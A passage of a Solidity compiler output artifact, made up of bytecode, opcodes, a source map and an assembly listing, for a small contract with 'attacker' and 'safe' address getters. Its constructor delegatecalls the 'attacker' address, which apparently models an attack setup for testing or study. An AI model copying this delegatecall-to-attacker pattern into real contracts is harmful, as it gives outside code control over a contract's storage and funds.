												"nativeSrc": "365:222:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "435:9:1",
														"nodeType": "YulTypedName",
														"src": "435:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "447:6:1",
														"nodeType": "YulTypedName",
														"src": "447:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "458:4:1",
														"nodeType": "YulTypedName",
														"src": "458:4:1",
														"type": ""
													}
												],
												"src": "365:222:1"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561000f575f5ffd5b5060043610610034575f3560e01c8063186f03541461003857806348eb76ee14610056575b5f5ffd5b610040610074565b60405161004d91906100fc565b60405180910390f35b61005e610098565b60405161006b91906100fc565b60405180910390f35b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e6826100bd565b9050919050565b6100f6816100dc565b82525050565b5f60208201905061010f5f8301846100ed565b9291505056fea26469706673582212201340d7c46579a0c510b0c09cc75cea69e1948ab2da9fd28e47d9e6af1613055964736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x186F0354 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0x48EB76EE EQ PUSH2 0x56 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x74 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x4D SWAP2 SWAP1 PUSH2 0xFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x5E PUSH2 0x98 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6B SWAP2 SWAP1 PUSH2 0xFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE6 DUP3 PUSH2 0xBD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF6 DUP2 PUSH2 0xDC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x10F PUSH0 DUP4 ADD DUP5 PUSH2 0xED JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SGT BLOCKHASH 0xD7 0xC4 PUSH6 0x79A0C510B0C0 SWAP13 0xC7 TLOAD 0xEA PUSH10 0xE1948AB2DA9FD28E47D9 DUPN 0xAF AND SGT SDIV MSIZE PUSH5 0x736F6C6343 STOP ADDMOD SAR STOP CALLER ",
							"sourceMap": "0:382:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;28:19;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;53:23;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;28:19;;;;;;;;;;;;;:::o;53:23::-;;;;;;;;;;;;;:::o;7:126:1:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:222::-;458:4;496:2;485:9;481:18;473:26;;509:71;577:1;566:9;562:17;553:6;509:71;:::i;:::-;365:222;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "66200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"attacker()": "2508",
								"safe()": "2485"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 0,
									"end": 382,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 0,
									"end": 382,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 0,
									"end": 382,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 83,
									"end": 380,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 83,
									"end": 380,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 83,
									"end": 380,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 83,
									"end": 380,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 83,
									"end": 380,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 83,
									"end": 380,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 83,
									"end": 380,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 83,
									"end": 380,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 83,
									"end": 380,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 146,
									"end": 151,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 139,
									"end": 143,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 139,
									"end": 143,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 139,
									"end": 151,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 139,
									"end": 151,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 139,
									"end": 151,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 139,
									"end": 151,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 139,
									"end": 151,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 172,
									"end": 181,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 161,
									"end": 169,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 161,
									"end": 169,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 161,
									"end": 181,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 161,
									"end": 181,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 161,
									"end": 181,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 161,
									"end": 181,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 161,
									"end": 181,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 237,
									"end": 244,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 250,
									"end": 258,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 250,
									"end": 258,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 250,
									"end": 258,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 250,
									"end": 258,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 250,
									"end": 258,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 250,
									"end": 258,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 250,
									"end": 258,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 250,
									"end": 258,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 250,
									"end": 258,
									"name": "DIV",
									"source": 0
								},
								{
									"begin": 250,
									"end": 258,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 250,
									"end": 258,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 250,
									"end": 271,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 250,
									"end": 271,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 285,
									"end": 322,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "PUSH",
									"source": 0,
									"value": "24"
								},
								{
									"begin": 285,
									"end": 322,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 285,
									"end": 322,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 285,
									"end": 322,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 285,
									"end": 322,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "PUSH",
									"source": 0,
									"value": "2665F77D00000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 285,
									"end": 322,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 285,
									"end": 322,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 285,
									"end": 322,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 285,
									"end": 322,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 285,
									"end": 322,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 250,
									"end": 332,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "tag",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "DUP6",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "GAS",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "DELEGATECALL",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "EQ",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "10"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "3F"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "DUP5",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "RETURNDATACOPY",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "9"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "tag",
									"source": 0,
									"value": "10"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "PUSH",
									"source": 0,
									"value": "60"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "tag",
									"source": 0,
									"value": "9"
								},
								{
									"begin": 250,
									"end": 332,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 250,
									"end": 332,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 236,
									"end": 332,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 236,
									"end": 332,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 236,
									"end": 332,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 350,
									"end": 352,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "11"
								},
								{
									"begin": 342,
									"end": 373,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 342,
									"end": 373,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "PUSH",
									"source": 0,
									"value": "8C379A000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 342,
									"end": 373,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "PUSH",
									"source": 0,
									"value": "4"
								},
								{
									"begin": 342,
									"end": 373,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "12"
								},
								{
									"begin": 342,
									"end": 373,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "13"
								},
								{
									"begin": 342,
									"end": 373,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "tag",
									"source": 0,
									"value": "12"
								},
								{
									"begin": 342,
									"end": 373,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 342,
									"end": 373,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 342,
									"end": 373,
									"name": "tag",
									"source": 0,
									"value": "11"
								},
								{
									"begin": 342,
									"end": 373,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 129,
									"end": 380,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 83,
									"end": 380,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 0,
									"end": 382,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "14"
								},
								{
									"begin": 0,
									"end": 382,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 1,
									"value": "16"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 1,
									"value": "18"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 1,
									"value": "19"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "35"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "18"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 1,
									"value": "35"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "37"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "19"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 1,
									"value": "37"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 1
								},
